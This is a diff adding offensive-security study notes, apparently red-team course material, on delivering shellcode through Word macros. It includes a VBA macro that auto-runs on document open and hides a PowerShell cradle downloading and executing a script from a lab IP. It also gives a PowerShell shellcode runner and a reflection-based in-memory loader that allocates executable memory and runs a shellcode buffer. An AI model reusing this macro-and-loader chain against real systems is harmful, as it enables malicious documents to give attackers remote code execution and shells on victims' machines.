@@ -134,3 +134,118 @@ Sub AutoOpen()
     MyMacro
 End Sub
 ```
+
+***
+
+### PowerShell Shellcode Runner
+
+1. No shellcode embedded in the Word doc: Host a PowerShell script with the shellcode runner on your web server
+2. Word's VBA macro only runs a tiny PowerShell command to download and run that script
+3. PowerShell runs as a child of Word, so closing Word doesn't kill the shell
+4. Uses WaitForSingleObject API to keep PowerShell open until the shell connects
+
+{% code overflow="wrap" %}
+```bash
+# VBA Macro to Trigger PowerShell Cradle
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
+    Shell str, vbHide
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+{% endcode %}
+
+PowerShell Script with WaitForSingleObject (<mark style="color:$danger;">run.ps1</mark>)
+
+{% code overflow="wrap" %}
+```powershell
+$Kernel32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
+        uint flAllocationType, uint flProtect);
+        
+    [DllImport("kernel32", CharSet=CharSet.Ansi)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, 
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
+            uint dwCreationFlags, IntPtr lpThreadId);
+            
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, 
+        UInt32 dwMilliseconds);
+}
+"@
+
+Add-Type $Kernel32
+...
+
+[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
+```
+{% endcode %}
+
+***
+
+### Keep PowerShell in Memory (Reflection)
+
+<figure><img src="../../../.gitbook/assets/Screenshot 2026-05-05 at 11.35.44 in the morning.png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```csharp
+function LookupFunc {
+
+	Param ($moduleName, $functionName)
+
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+      [System.MulticastDelegate])
+
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+	return $type.CreateType()
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+{% endcode %}
+
